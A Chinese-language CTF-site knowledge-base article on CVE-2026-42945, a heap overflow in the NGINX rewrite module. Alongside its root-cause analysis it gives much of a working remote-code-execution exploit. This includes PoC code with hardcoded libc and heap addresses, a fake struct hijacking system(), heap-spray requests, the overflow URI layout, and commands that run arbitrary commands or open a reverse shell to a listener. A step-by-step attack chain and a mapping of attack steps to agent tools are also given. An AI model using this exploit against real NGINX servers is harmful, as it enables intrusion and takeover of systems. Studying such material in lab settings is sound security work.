---
id: "ctf-website/09-cve/06-nginx-rewrite-heapoverflow"
title: "NGINX rewrite 模块：set 缓冲区长度错配堆溢出（CVE-2026-42945）"
title_en: "NGINX rewrite Module: set Buffer Length Mismatch Heap Overflow (CVE-2026-42945)"
summary: >
  NGINX rewrite模块漏洞分析，rewrite将URI改写到带?的内部路径触发转义状态，set指令按原始捕获内容长度申请堆缓冲区但复制时展开URI转义（+→%2B），导致堆溢出。涵盖受影响版本、长度计算与复制语义不一致的核心矛盾、Docker复现环境、PoC堆喷射与伪结构体构造。注意此PoC非通用一键打（依赖ASLR关闭和地址硬编码）。
summary_en: >
  NGINX rewrite module vulnerability analysis where rewrite changes URI to an internal path with ? triggering escape state, and set directive allocates heap buffer by original capture length but copies with URI escape expansion (+→%2B), causing heap overflow. Covers affected versions, core contradiction of length calculation vs copy semantics, Docker reproduction environment, and PoC heap spray with fake struct construction. Note this PoC is not universal (relies on ASLR disabled and hardcoded addresses).
board: "ctf-website"
category: "09-cve"
signals: ["NGINX", "rewrite", "heap overflow", "set directive", "堆溢出", "缓冲区长度错配", "CVE-2026-42945", "URI escape"]
mcp_tools: ["kb_router", "http_probe", "workspace_write_text"]
keywords: ["CVE-2026-42945", "NGINX堆溢出", "rewrite模块", "set指令", "缓冲区溢出", "URI转义", "heap spray", "system()劫持"]
difficulty: "advanced"
tags: ["cve", "nginx", "heap-overflow", "rce", "ctf", "exploit-development"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# NGINX rewrite 模块：set 缓冲区长度错配堆溢出（CVE-2026-42945）

## 1. 受影响版本

NGINX Open Source `0.6.27` – `1.30.0`。修复版本：`1.30.1+`、`1.31.0+`。

## 2. 根因：rewrite + set 长度计算和复制语义不一致

`rewrite` 把 URI 改写到带 `?` 的内部路径，`set` 又把正则捕获组塞进变量。长度按「原始捕获内容」算，复制时却按 URI 转义展开。遇到大量 `+` 这种需要扩展的字符，堆缓冲区就被撑裂了。

```nginx
# 漏洞触发配置
location ~ ^/api/(.*)$ {
    rewrite ^/api/(.*)$ /internal?migrated=true;   # ? 触发带查询串的 rewrite 状态
    set $original_endpoint $1;                      # 按原始长度申请，复制时扩展
}
```

### 核心矛盾

```text
1. rewrite 让后续逻辑进入「需要处理参数 / 转义」的状态
2. set $original_endpoint $1 准备保存捕获组
3. NGINX 按 $1 原始长度申请内存
4. 复制时却把部分字符扩展为 3 倍长度（如 + → %2B）
5. 多出来的数据写出堆缓冲区
```

同一段字符串，在长度估算阶段和复制阶段被用了两套规则。

## 3. 调用链

```
远程攻击者
    → 发送特制 /api/<payload> 请求
    → location 正则捕获超长路径片段到 $1
    → rewrite 到 /internal?migrated=true（? 触发带查询串的 rewrite 状态）
    → set $original_endpoint $1 申请过小堆缓冲区
    → 大量 '+' 在复制阶段发生转义扩展（+ → %2B）
    → 堆缓冲区溢出，覆盖相邻堆对象
    → 堆喷射 /spray + X-Delay 控制堆布局
    → 劫持指针到 system() 地址
    → system("<cmd>") 执行任意命令
```

## 4. 复现环境

本仓库提供 Docker 一键环境：

```bash
cd "CVE-2026-42945 NGINX Rift/env"
docker compose up --build
```

NGINX 对宿主机暴露 `127.0.0.1:19321`。

### 环境关键设计

| 文件 | 作用 |
|------|------|
| `Dockerfile` | 从源码构建 NGINX，固定到 commit `98fc3bb78` |
| `nginx.conf` | 漏洞触发配置：`rewrite` + `set $1` + `/spray` |
| `server.py` | 本地后端服务，`X-Delay` 延迟响应维持请求生命周期 |
| `entrypoint.sh` | `setarch x86_64 -R` 禁用 ASLR，固定地址布局 |

## 5. PoC 分析

```python
# 固定关键地址（ASLR 关闭的实验环境）
HEAP_BASE = 0x555555659000
LIBC_BASE = 0x7ffff77ba000
SYSTEM_ADDR = LIBC_BASE + 0x50d70

# 构造伪结构体（system() 地址 | 命令字符串地址 | 0）
def make_body(cmd, data_addr):
    fake_struct = struct.pack('<QQQ', SYSTEM_ADDR, data_addr, 0)
    cmd_bytes = cmd.encode('utf-8') + b'\x00'
    payload = fake_struct + cmd_bytes
    return payload + b'\x41' * (BODY_LEN - len(payload))

# 堆喷射 /spray（X-Delay: 60 让请求对象不释放）
req = (
    b"POST /spray HTTP/1.1\r\n"
    b"Host: l\r\n"
    b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
    b"X-Delay: 60\r\n"
    b"Connection: close\r\n"
    b"\r\n" + body
)

# 溢出 URI：A*349 + +*969 + target_bytes
payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
```

### 为什么这个 PoC 不是通用一键打

| 限制 | 说明 |
|------|------|
| 地址硬编码 | HEAP_BASE、LIBC_BASE、SYSTEM_ADDR 写死 |
| 依赖 ASLR 关闭 | entrypoint.sh 使用 `setarch -R` |
| 依赖特定构建 | Dockerfile 固定 NGINX commit 和 Ubuntu 22.04 libc |
| 依赖特定配置 | 必须有漏洞触发配置组合 |
| 依赖堆布局 | /spray、延迟后端、候选偏移都是为实验环境调过的 |

## 6. 复现

```bash
cd "CVE-2026-42945 NGINX Rift"
python3 exploit/exp.py --host 127.0.0.1 --port 19321 \
  --cmd 'touch /tmp/nginx-rift-pwned'

# 验证
docker compose exec nginx ls -l /tmp/nginx-rift-pwned
```

### 反弹 shell

```bash
python3 exploit/exp.py \
  --host 127.0.0.1 --port 19321 \
  --shell --listen-ip 172.17.0.1 --listen-port 1337
```

## 7. 观察指标

- PoC 输出 `crashed — system("<cmd>") executed`
- 容器内文件系统出现预期创建的文件
- 堆喷射后 worker 进程 crash 或进入 system()

## 攻击链

```
1. 确认 NGINX 版本受影响 + 目标启用了 rewrite/set 相关配置
2. 用固定关键地址构造伪结构体（system() 地址 | 命令字符串地址 | 0）
3. /spray 堆喷射（X-Delay 让请求对象不释放）→ 稳定堆布局
4. 发送溢出 URI（A*349 + +*969 + target_bytes）→ set 缓冲区长度错配写越界
5. 覆盖相邻堆结构 → 劫持控制流跳入 system()
6. 验证命令执行 / 反弹 shell → RCE
```

## Evidence

记录: NGINX 版本、堆喷射请求/响应、溢出 URI 长度、system() 执行证据

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 NGINX / rewrite / 堆溢出信号搜索 |
| HTTP 探测 | `http_probe` | 确认 NGINX 端口可达 |
| 写分析笔记 | `workspace_write_text` | 记录复现结果 |

## 参考资料

| 来源 | 链接 |
|------|------|
| NGINX 官方安全公告 | https://nginx.org/en/security_advisories.html |
| F5 Advisory K000161019 | https://my.f5.com/manage/s/article/K000161019 |
| CVE 官方记录 | https://www.cve.org/CVERecord?id=CVE-2026-42945 |
| 腾讯云分析 | https://cloud.tencent.com/developer/article/2671091 |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-42945%20NGINX%20Rift |
